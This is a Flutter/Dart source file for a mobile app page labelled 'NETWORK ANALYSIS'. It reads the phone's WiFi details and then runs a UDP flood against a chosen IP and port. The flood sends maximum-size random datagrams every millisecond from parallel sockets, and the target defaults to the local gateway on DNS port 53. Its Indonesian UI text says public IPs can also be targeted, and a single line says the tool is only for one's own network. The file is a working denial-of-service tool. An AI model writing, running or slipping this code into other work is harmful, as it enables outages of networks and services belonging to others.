import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'theme.dart';

class WifiExternalPage extends StatefulWidget {
  const WifiExternalPage({super.key});

  @override
  State<WifiExternalPage> createState() => _WifiExternalPageState();
}

class _WifiExternalPageState extends State<WifiExternalPage> {
  String ssid = '-';
  String ip = '-';
  String gateway = '-';
  bool isKilling = false;
  Timer? _loopTimer;
  final TextEditingController _targetCtrl = TextEditingController();
  final TextEditingController _portCtrl = TextEditingController(text: '53');

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Android 10+ wajib izin lokasi buat baca SSID.
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _alert('Permission Denied',
          'Akses lokasi diperlukan untuk membaca info WiFi.');
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gw = await info.getWifiGatewayIP();

      // getWifiName kadang balikin SSID dengan kutip di ujung, buang dulu.
      final cleanSsid = name?.replaceAll('"', '');

      if (!mounted) return;
      setState(() {
        ssid = cleanSsid ?? '-';
        ip = ipAddr ?? '-';
        gateway = gw ?? '-';
        // Default target = gateway, biar langsung bisa START tanpa edit.
        _targetCtrl.text = gw ?? '';
      });
    } catch (_) {
      if (!mounted) return;
      setState(() {
        ssid = ip = gateway = 'Error';
      });
    }
  }

  void _startFlood() {
    final target = _targetCtrl.text.trim();
    final portStr = _portCtrl.text.trim();

    if (target.isEmpty) {
      _alert('Error', 'Target IP kosong.');
      return;
    }

    final port = int.tryParse(portStr);
    if (port == null || port < 1 || port > 65535) {
      _alert('Error', 'Port harus 1-65535.');
      return;
    }

    // Validasi IP literal (v4). Tolak hostname, biar tidak salah ketik.
    final parsed = InternetAddress.tryParse(target);
    if (parsed == null) {
      _alert('Error', 'Format IP tidak valid. Contoh: 192.168.1.1');
      return;
    }

    setState(() => isKilling = true);

    // Payload 65495 byte = batas maksimum datagram UDP dikurangi header
    // IP+UDP, biar tidak di-fragment di layer transport.
    final payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    // 1ms = batas bawah praktis Timer.periodic di Dart.
    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        // Dua socket paralel per tick biar queue kernel tidak jadi bottleneck.
        for (var i = 0; i < 2; i++) {
          final socket =
              await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (var j = 0; j < 9; j++) {
            socket.send(payload, parsed, port);
          }
          socket.close();
        }
      } catch (_) {
        // Socket bind bisa gagal kalau file descriptor habis. Skip tick.
      }
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
  }

  void _alert(String title, String message) {
    if (!mounted) return;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: VokraTheme.surfaceDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rLg),
          side: const BorderSide(color: VokraTheme.hairline),
        ),
        title: Text(title,
            style: VokraTheme.displaySm.copyWith(color: VokraTheme.onDark)),
        content: Text(message,
            style: VokraTheme.bodySm.copyWith(color: VokraTheme.onDarkSoft)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('OK',
                style: VokraTheme.button.copyWith(color: VokraTheme.primary)),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 10),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 96,
            child: Text(label, style: VokraTheme.captionUpper),
          ),
          Expanded(
            child: Text(value,
                style: VokraTheme.bodySm.copyWith(color: VokraTheme.ink)),
          ),
        ],
      ),
    );
  }

  Widget _label(String text) => Padding(
        padding: const EdgeInsets.only(bottom: 6),
        child: Text(text, style: VokraTheme.captionUpper),
      );

  InputDecoration _inputDeco(String hint) => InputDecoration(
        hintText: hint,
        hintStyle: VokraTheme.bodySm.copyWith(color: VokraTheme.mutedSoft),
        filled: true,
        fillColor: VokraTheme.canvas,
        contentPadding:
            const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rMd),
          borderSide: const BorderSide(color: VokraTheme.hairline),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rMd),
          borderSide: const BorderSide(color: VokraTheme.primary, width: 1.5),
        ),
      );

  @override
  void dispose() {
    _loopTimer?.cancel();
    _targetCtrl.dispose();
    _portCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: VokraTheme.canvas,
      appBar: AppBar(
        title: Text('LOCAL NETWORK', style: VokraTheme.displaySm),
        backgroundColor: VokraTheme.canvas,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.fromLTRB(24, 8, 24, 32),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Banner
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: VokraTheme.surfaceDark,
                  borderRadius: BorderRadius.circular(VokraTheme.rLg),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('NETWORK ANALYSIS',
                        style: VokraTheme.displayMd
                            .copyWith(color: VokraTheme.onDark)),
                    const SizedBox(height: 8),
                    Text(
                      'Baca jaringan WiFi yang sedang tersambung dan kirim flood '
                      'UDP ke target IP yang kamu tentukan.',
                      style: VokraTheme.bodySm
                          .copyWith(color: VokraTheme.onDarkSoft),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // Info card
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: VokraTheme.surfaceCard,
                  borderRadius: BorderRadius.circular(VokraTheme.rLg),
                  border: Border.all(color: VokraTheme.hairlineSoft),
                ),
                child: Column(
                  children: [
                    _infoRow('SSID', ssid),
                    const Divider(height: 1),
                    _infoRow('IP', ip),
                    const Divider(height: 1),
                    _infoRow('GATEWAY', gateway),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // Target + port
              Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Expanded(
                    flex: 3,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _label('TARGET IP'),
                        TextField(
                          controller: _targetCtrl,
                          keyboardType: TextInputType.numberWithOptions(
                              decimal: true),
                          inputFormatters: [
                            FilteringTextInputFormatter.allow(
                                RegExp(r'[0-9.]')),
                          ],
                          style: VokraTheme.bodySm
                              .copyWith(color: VokraTheme.ink),
                          decoration: _inputDeco('192.168.1.1'),
                          enabled: !isKilling,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    flex: 2,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _label('PORT'),
                        TextField(
                          controller: _portCtrl,
                          keyboardType: TextInputType.number,
                          inputFormatters: [
                            FilteringTextInputFormatter.digitsOnly,
                          ],
                          style: VokraTheme.bodySm
                              .copyWith(color: VokraTheme.ink),
                          decoration: _inputDeco('53'),
                          enabled: !isKilling,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 8),
              Text(
                'Default target = gateway kamu. Ganti ke IP lain di LAN atau '
                'IP publik kalau perlu. Port default 53 (UDP DNS).',
                style: VokraTheme.caption.copyWith(color: VokraTheme.muted),
              ),
              const SizedBox(height: 20),

              // Action
              ElevatedButton.icon(
                onPressed: isKilling ? _stopFlood : _startFlood,
                icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, size: 18),
                label: Text(isKilling ? 'STOP' : 'START'),
              ),
              if (isKilling) ...[
                const SizedBox(height: 20),
                Row(
                  children: [
                    const SizedBox(
                      width: 16, height: 16,
                      child: CircularProgressIndicator(strokeWidth: 2),
                    ),
                    const SizedBox(width: 12),
                    Text('Sending packets...', style: VokraTheme.bodySm),
                  ],
                ),
              ],
              const SizedBox(height: 32),
              Text(
                'Flood dari HP terbatas oleh bandwidth upload dan kebijakan '
                'ISP. Efektif untuk target di LAN yang sama. Hanya untuk '
                'jaringan sendiri.',
                style: VokraTheme.caption.copyWith(color: VokraTheme.muted),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
